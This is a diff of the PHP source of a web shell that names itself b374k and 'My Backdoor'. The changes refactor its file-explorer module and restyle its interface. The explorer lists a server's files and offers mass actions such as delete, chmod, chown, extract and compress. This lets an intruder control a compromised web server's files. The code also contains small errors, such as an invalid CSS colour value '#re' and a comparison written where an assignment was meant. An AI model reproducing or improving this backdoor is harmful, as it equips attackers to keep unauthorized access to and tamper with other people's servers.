@@ -1,15 +1,6 @@
 <?php
 $GLOBALS['module_to_load'] = array("explorer");
 
-@ob_start();
-error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
-@ini_set('html_errors','0');
-@ini_set('display_errors','1');
-@ini_set('display_startup_errors','1');
-@ini_set('log_errors','0');
-@set_time_limit(0);
-@clearstatcache();
-
 if(!function_exists('getSelf')){
 	function getSelf(){
 		$query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:"";
@@ -155,8 +146,8 @@ if(!function_exists('format_bit')){
 	}
 }
 
-if(!function_exists('get_filesize')){
-	function get_filesize($file){
+if(!function_exists('getFileSize')){
+	function getFileSize($file){
 		$size = @filesize($file);
 		if($size!==false){
 			if($size<=0) return 0;
@@ -349,7 +340,7 @@ if(!function_exists('view_file')){
 			$output .= "
 			<table id='viewFile' class='boxtbl'>
 			<tr><td style='width:120px;'>Filename</td><td>".html_safe($file)."</td></tr>
-			<tr><td>Size</td><td>".get_filesize($file)." (".filesize($file).")</td></tr>
+			<tr><td>Size</td><td>".getFileSize($file)." (".filesize($file).")</td></tr>
 			".$owner."
 			<tr><td>Permission</td><td>".getFileperms($file)."</td></tr>
 			<tr><td>Create time</td><td>".@date("d-M-Y H:i:s",filectime($file))."</td></tr>
@@ -407,8 +398,9 @@ if (!function_exists("listFiles")) {
 }
 
 if (!function_exists("showFiles")) {
-	function showFiles()
+	function showFiles($path)
 	{
+		$output = "";
 		$finfo = array();
 		if (is_win()) {
 			$finfo = array(
@@ -422,150 +414,98 @@ if (!function_exists("showFiles")) {
 							"modified"=>"getFiletime"
 						);
 		}
+		$totalFiles = @count(listFiles($path, "all"));
+		$totalFolders = 0;
+
 		$output .= "<table id='xplTable' class='dataView sortable'><thead>";
 		$output .= "<tr>
 						<th class='col-cbox sorttable_nosort'>
 							<div class='cBoxAll'></div>
 						</th>
-						<th class='col-name'>name</th>
-						<th class='col-size'>size</th>";
+						<th class='col-name'>Filename</th>
+						<th class='col-size'>Size</th>";
 		foreach ($finfo as $key => $value) {
 			$output .= "<th class='col-".$key."'>".$key."</th>";
 		}
 		$output .= "</tr></thead><tbody>";
 
-		foreach (listFiles(get_cwd(), "dir") as $key => $value) {
+		foreach (listFiles($path, "dir") as $key => $value) {
 			$cboxException = "";
 			if (($value[0] == ".") || ($value[0] == "..")) {
 				$action  = "actiondot";
 				$cboxException = " cBoxException";
 			} else {
 				$action = "actionfolder";
+				$totalFolders++;
 			}
-			$output .= "<td style='white-space:normal;'>
-							<a class='navigate'>".html_safe($value[1])."</a>
+			$output .= "
+						<tr data-path=\"".html_safe(realpath($value[0]).DIRECTORY_SEPARATOR)."\"><td><div class='cBox".$cboxException."'></div></td>
+						<td style='white-space:normal;'>
+							<a class='navigate'>".$value[1]."</a>
 							<span class='".$action." floatRight'>action</span>
 						</td>
 						<td>DIR</td>";
 			foreach ($finfo as $key => $values) {
 				$sortable = "";
-				if ($key == "modified") $sortable = " title='" .filemtime($value). "'";
-				$output .= "<td" .$sortable. ">" .$values($value). "</td>";
+				if ($key == "modified") $sortable = " title='" .filemtime($value[1]). "'";
+				$output .= "<td" .$sortable. ">" .$values($value[1]). "</td>";
 			}
 			$output .= "</tr>";
 		}
-	}
-}
 
-if(!function_exists('show_all_files')){
-	function show_all_files($path){
-		if(!is_dir($path)) return "No such directory : ".$path;
-		chdir($path);
-		$output = "";
-		$allfiles = $allfolders = array();
-		if($res = opendir($path)){
-			while($file = readdir($res)){
-				if(($file!='.')&&($file!="..")){
-					if(is_dir($file)) $allfolders[] = $file;
-					elseif(is_file($file))$allfiles[] = $file;
-				}
-			}
-		}
-
-		array_unshift($allfolders, ".");
-		$cur = getcwd();
-		chdir("..");
-		if(getcwd()!=$cur) array_unshift($allfolders, "..");
-		chdir($cur);
-
-		natcasesort($allfolders);
-		natcasesort($allfiles);
-
-		$cols = array();
-		if(is_win()){
-			$cols = array(
-				"perms"=>"getFileperms",
-				"modified"=>"getFiletime"
-			);
-		}
-		else{
-			$cols = array(
-				"owner"=>"getFileowner",
-				"perms"=>"getFileperms",
-				"modified"=>"getFiletime"
-			);
-		}
-
-		$totalFiles = count($allfiles);
-		$totalFolders = 0;
-
-		$output .= "<table id='xplTable' class='dataView sortable'><thead>";
-		$output .= "<tr><th class='col-cbox sorttable_nosort'><div class='cBoxAll'></div></th><th class='col-name'>name</th><th class='col-size'>size</th>";
-
-		foreach($cols as $k=>$v){
-			$output .= "<th class='col-".$k."'>".$k."</th>";
-		}
-		$output .= "</tr></thead><tbody>";
-
-		foreach($allfolders as $d){
-			$cboxException = "";
-			if(($d==".")||($d=="..")){
-				$action = "actiondot";
-				$cboxException = " cBoxException";
-			}
-			else{
-				$action = "actionfolder";
-				$totalFolders++;
-			}
-			$output .= "
-			<tr data-path=\"".html_safe(realpath($d).DIRECTORY_SEPARATOR)."\"><td><div class='cBox".$cboxException."'></div></td>
-			<td style='white-space:normal;'><a class='navigate'>[ ".html_safe($d)." ]</a><span class='".$action." floatRight'>action</span></td>
-			<td>DIR</td>";
-			foreach($cols as $k=>$v){
+		foreach (listFiles($path, "file") as $key => $value) {
+			$output .= "<tr data-path=\"".html_safe(realpath($value[1]))."\">
+							<td>
+								<div class='cBox'></div>
+							</td>
+							<td style='white-space:normal;'>
+								<a class='view'>".html_safe($value[1])."</a>
+								<span class='action floatRight'>action</span>
+							</td>
+							<td title='" .filesize($value[0]). "'>" .getFileSize($value[0]). "</td>";
+			foreach ($finfo as $key => $values) {
 				$sortable = "";
-				if($k=='modified') $sortable = " title='".filemtime($d)."'";
-				$output .= "<td".$sortable.">".$v($d)."</td>";
+				if ($key == "modified") $sortable == " title='" .filemtime($value[1]). "'";
+				$output .= "<td" .$sortable. ">" .$values($value[0]). "</td>";
 			}
 			$output .= "</tr>";
-		}
-		foreach($allfiles as $f){
-			$output .= "
-			<tr data-path=\"".html_safe(realpath($f))."\"><td><div class='cBox'></div></td>
-			<td style='white-space:normal;'><a class='view'>".html_safe($f)."</a><span class='action floatRight'>action</span></td>
-			<td title='".filesize($f)."'>".get_filesize($f)."</td>";
-			foreach($cols as $k=>$v){
-				$sortable = "";
-				if($k=='modified') $sortable = " title='".filemtime($f)."'";
-				$output .= "<td".$sortable.">".$v($f)."</td>";
-			}
-			$output .= "</tr>";
+
 		}
 		$output .= "</tbody><tfoot>";
 
-		$colspan = 1 + count($cols);
-		$output .= "<tr><td><div class='cBoxAll'></div></td><td>
-		<select id='massAction' class='colSpan'>
-		<option disabled selected>Action</option>
-		<option>cut</option>
-		<option>copy</option>
-		<option>paste</option>
-		<option>delete</option>
-		<option disabled>------------</option>
-		<option>chmod</option>
-		<option>chown</option>
-		<option>touch</option>
-		<option disabled>------------</option>
-		<option>extract (tar)</option>
-		<option>extract (tar.gz)</option>
-		<option>extract (zip)</option>
-		<option disabled>------------</option>
-		<option>compress (tar)</option>
-		<option>compress (tar.gz)</option>
-		<option>compress (zip)</option>
-		<option disabled>------------</option>
-		</select>
-		</td><td colspan='".$colspan."'></td></tr>
-		<tr><td></td><td colspan='".++$colspan."'>".$totalFiles." file(s), ".$totalFolders." Folder(s)<span class='xplSelected'></span></td></tr>
+		$colspan = 1 + count($finfo);
+		$output .= "<tr>
+						<td>
+							<div class='cBoxAll'></div>
+						</td>
+						<td>
+							<select id='massAction' class='colSpan'>
+								<option disabled selected>Action</option>
+								<option>cut</option>
+								<option>copy</option>
+								<option>paste</option>
+								<option>delete</option>
+								<option disabled>------------</option>
+								<option>chmod</option>
+								<option>chown</option>
+								<option>touch</option>
+								<option disabled>------------</option>
+								<option>extract (tar)</option>
+								<option>extract (tar.gz)</option>
+								<option>extract (zip)</option>
+								<option disabled>------------</option>
+								<option>compress (tar)</option>
+								<option>compress (tar.gz)</option>
+								<option>compress (zip)</option>
+								<option disabled>------------</option>
+							</select>
+						</td>
+						<td colspan='".$colspan."'></td>
+					</tr>
+					<tr>
+						<td></td>
+						<td colspan='".++$colspan."'>".$totalFiles." file(s), ".$totalFolders." Folder(s)<span class='xplSelected'></span></td>
+					</tr>
 		";
 		$output .= "</tfoot></table>";
 		return $output;
@@ -605,10 +545,10 @@ if(isset($p['viewEntry'])){
 		chdir($path);
 		$nav = getNav($path);
 		$cwd = html_safe($path);
-		$explorer_content = show_all_files($path);
+		$explorer_content = showFiles($path);
 	}
 }
-else $explorer_content = show_all_files(get_cwd());
+else $explorer_content = showFiles(get_cwd());
 
 $GLOBALS['module']['explorer']['id'] = "explorer";
 $GLOBALS['module']['explorer']['title'] = "Explorer";
@@ -629,7 +569,7 @@ if(isset($p['cd'])){
 		setcookie("cwd", $path);
 		$res = $path."{[|b374k|]}".getNav($path)."{[|b374k|]}";
 		if(isset($p['showfiles'])&&($p['showfiles']=='true')){
-			$res .= show_all_files($path);
+			$res .= showFiles($path);
 		}
 	}
 	else $res = "error";
@@ -793,10 +733,12 @@ if(!function_exists('decode_line')){
 		<meta name='robots' content='noindex, nofollow, noarchive'>
 		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0">
 		<style type="text/css">
+			@import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300&display=swap');
 			*{
 				margin:0;
 				padding:0;
 				border:0;
+				font-family: 'Ubuntu', sans-serif;
 				-webkit-box-sizing:border-box;
 				-moz-box-sizing:border-box;
 				box-sizing:border-box;
@@ -809,7 +751,7 @@ if(!function_exists('decode_line')){
 			html, body{
 				width:100%;
 				height:100%;
-				color:#222222;
+				color:#fff;
 			}
 			body{
 				background:#f0f0f0;
@@ -817,7 +759,7 @@ if(!function_exists('decode_line')){
 			}
 			a{
 				text-decoration:none;
-				color:#000000;
+				color:#fff;
 			}
 			a:hover{
 				cursor:pointer;
@@ -830,6 +772,8 @@ if(!function_exists('decode_line')){
 			}
 			table{
 				width:100%;
+				border-collapse: collapse;
+				border-spacing: 0;
 			}
 			table td, table th{
 				vertical-align:middle;
@@ -888,7 +832,7 @@ if(!function_exists('decode_line')){
 			}
 			#headerNav{
 				padding:10px 8px 6px 8px;
-				background:#333333;
+				background:#4C4C4C;
 			}
 			#headerNav img{
 				margin:0 4px;
@@ -911,7 +855,7 @@ if(!function_exists('decode_line')){
 			}
 			#menu .menuitem:hover, #menu .menuitemSelected{
 				background:#768999;
-				color:#ffffff;
+				color:#fff;
 			}
 			#menu .menuitemSelected{
 				background:#768999;
@@ -922,12 +866,12 @@ if(!function_exists('decode_line')){
 				border-bottom:1px dashed #dddddd;
 			}
 			#content{
-				background:#f0f0f0;
+				background:#4C4C4C;
 				height:100%;
 				padding:66px 8px 8px 8px;
 			}
 			#content .menucontent{
-				background:#f0f0f0;
+				background:#4C4C4C;
 				clear:both;
 				display:none;
 				padding:8px;
@@ -963,21 +907,19 @@ if(!function_exists('decode_line')){
 			#devTitle{
 				background:#ebebeb;
 			}
-			.box{
+			.box {
 				min-width:50%;
-				border:1px solid #dddddd;
+				background: #404040;
 				padding:8px 8px 0 8px;
 				border-radius:8px;
 				position:fixed;
-				background:#ebebeb;
 				opacity:1;
 				box-shadow:1px 1px 25px #150f0f;
 				opacity:0.98;
 			}
 			.boxtitle{
-				background:#dddddd;
-				border: 1px solid #cccccc;
-				color:#000000;
+				background:#4C4C4C;
+				color:#fff;
 				border-radius:8px;
 				text-align:center;
 				cursor:pointer;
@@ -990,20 +932,17 @@ if(!function_exists('decode_line')){
 			}
 			.boxresult{
 				padding:4px 10px 6px 10px;
-				border-top:1px solid #dddddd;
 				margin-top:4px;
 				text-align:center;
 			}
 			.boxtbl{
-				border:1px solid #dddddd;
 				border-radius:8px;
 				padding-bottom:8px;
-				background:#ebebeb;
+				background:#4C4C4C;
 			}
 			.boxtbl td{
 				vertical-align:middle;
 				padding:8px 15px;
-				border-bottom:1px dashed #dddddd;
 			}
 			.boxtbl input, .boxtbl select, .boxtbl .button{
 				width:100%;
@@ -1014,7 +953,7 @@ if(!function_exists('decode_line')){
 				padding-bottom:8px;
 			}
 			.boxclose{
-				background:#222222;
+				background:#404040;
 				border-radius:3px;
 				margin-right:8px;
 				margin-top:-3px;
@@ -1034,17 +973,18 @@ if(!function_exists('decode_line')){
 				width:120px;
 				margin:2px;
 				color:#ffffff;
-				background:#7C94A8;
+				background:#404040;
 				border:none;
-				padding:8px;
+				padding:6px;
 				border-radius:8px;
+				border: 2px solid #404040;
 				display:block;
 				text-align:center;
 				float:left;
 				cursor:pointer;
 			}
 			.button:hover, #ulDragNDrop:hover{
-				background:#768999;
+				border: 2px solid #ff6b6b;
 			}
 			.floatLeft{
 				float:left;
@@ -1061,7 +1001,7 @@ if(!function_exists('decode_line')){
 			}
 			.border{
 				border:1px solid #dddddd;
-				background:#ebebeb;
+				background:#re;
 				border-radius:8px;
 				padding:8px;
 			}
@@ -1092,6 +1032,16 @@ if(!function_exists('decode_line')){
 			}
 			.action, .actionfolder, .actiondot{
 				cursor:pointer;
+				background: #404040;
+				padding: 1px;
+				padding-left: 5px;
+				padding-right: 5px;
+				border-radius: 4px;
+				border: 2px solid #404040;
+			}
+			.action:hover, .actionfolder:hover, .actiondot:hover {
+				background: #383838;
+				border: 2px solid #ff6b6b;
 			}
 			.phpError{
 				padding:8px;
@@ -1100,15 +1050,18 @@ if(!function_exists('decode_line')){
 			}
 			.dataView td, .dataView th, #viewFile td{
 				vertical-align:top;
-				border-bottom:1px dashed #dddddd;
 			}
 			.dataView tbody tr:hover{
-				background:#ebebeb;
+				background:#5D5D5D;
+			}
+			.dataView th:nth-child(2) {
+				text-align: left;
 			}
 			.dataView th{
 				vertical-align:middle;
 				border-bottom:0;
-				background:#e0e0e0;
+				background:#4C4C4C;
+				font-size: 20px;
 			}
 			.dataView tfoot td{
 				vertical-align:middle;
@@ -1123,7 +1076,9 @@ if(!function_exists('decode_line')){
 			#xplTable tr>td:nth-child(3){
 				text-align:left;
 			}
-			#xplTable tr>td:nth-child(4),#xplTable tr>td:nth-child(5),#xplTable tr>td:nth-child(6){
+			#xplTable tr>td:nth-child(4),
+			#xplTable tr>td:nth-child(5),
+			#xplTable tr>td:nth-child(6){
 				text-align:center;
 			}
 			.dataView .col-owner{
@@ -1150,7 +1105,7 @@ if(!function_exists('decode_line')){
 			}
 			#viewFilecontent{
 				padding:8px;
-				border:1px solid #dddddd;
+				background: #404040;
 				border-radius:8px;
 			}
 			#terminalPrompt td{
@@ -1180,8 +1135,21 @@ if(!function_exists('decode_line')){
 			.hl_comment{
 				color:#7F9F7F;
 			}
-			#navigation{position:fixed;left:-16px;top:46%;}
-			#totop,#tobottom,#toggleBasicInfo{background:url('<?php echo get_resource('arrow');?>');width:32px;height:32px;opacity:0.30;margin:18px 0;cursor:pointer;}
+			#navigation { 
+				position:fixed;
+				left:-16px;
+				top:46%;
+			}
+			#totop,
+			#tobottom,
+			#toggleBasicInfo { 
+				background:url('<?php echo get_resource('arrow');?>');
+				width:32px;
+				height:32px;
+				opacity:0.30;
+				margin:18px 0;
+				cursor:pointer;
+			}
 			#totop:hover,#tobottom:hover{opacity:0.80;}
 			#toggleBasicInfo{display:none;float:right;margin:0;}
 			#basicInfoSplitter{display:none;}
@@ -1191,46 +1159,26 @@ if(!function_exists('decode_line')){
 		</style>
 	</head>
 	<body>
-		<!--wrapper start-->
 		<div id='wrapper'>
-			<!--header start-->
 			<div id='header'>
-				<!--header info start-->
 				<div id='headerNav'>
 					<span><a onclick="set_cookie('cwd', '');" href='<?php echo getSelf(); ?>'>My Backdoor</a></span>
 					<img onclick='viewfileorfolder();' id='b374k' src='<?php echo get_resource('b374k');?>' />&nbsp;<span id='nav'><?php echo $nav; ?></span>
 				</div>
-				<!--header info end-->
-
-				<!--menu start-->
-				
-				<!--menu end-->
-
 			</div>
-			<!--header end-->
-
-			<!--content start-->
 			<div id='content'>
-				<!--server info start-->
-				<!--server info end-->
-
 				<?php
-				foreach($GLOBALS['module_to_load'] as $value){
-					$content = $GLOBALS['module'][$value]['content'];
-					echo "<div class='menucontent' id='".$GLOBALS['module'][$value]['id']."'>".$content."</div>";
+				foreach(array("explorer") as $value){
+					echo "<div class='menucontent' id='".$GLOBALS['module'][$value]['id']."'>".$GLOBALS['module'][$value]['content']."</div>";
 				}
 				?>
 			</div>
-			<!--content end-->
-
 		</div>
-		<!--wrapper end-->
 		<table id="overlay"><tr><td><div id="loading" ondblclick='loading_stop();'></div></td></tr></table>
 		<form action='<?php echo getSelf(); ?>' method='post' id='form' target='_blank'></form>
-		<!--script start-->
 		<script type='text/javascript'>
 			var targeturl = '<?php echo getSelf(); ?>';
-			var module_to_load = '<?php echo implode(",", $GLOBALS['module_to_load']);?>';
+			var module_to_load = '<?php echo "explorer";?>';
 			var win = <?php echo (is_win())?'true':'false';?>;
 			var init_shell = true;
 			/* Zepto v1.1.2 - zepto event ajax form ie - zeptojs.com/license */
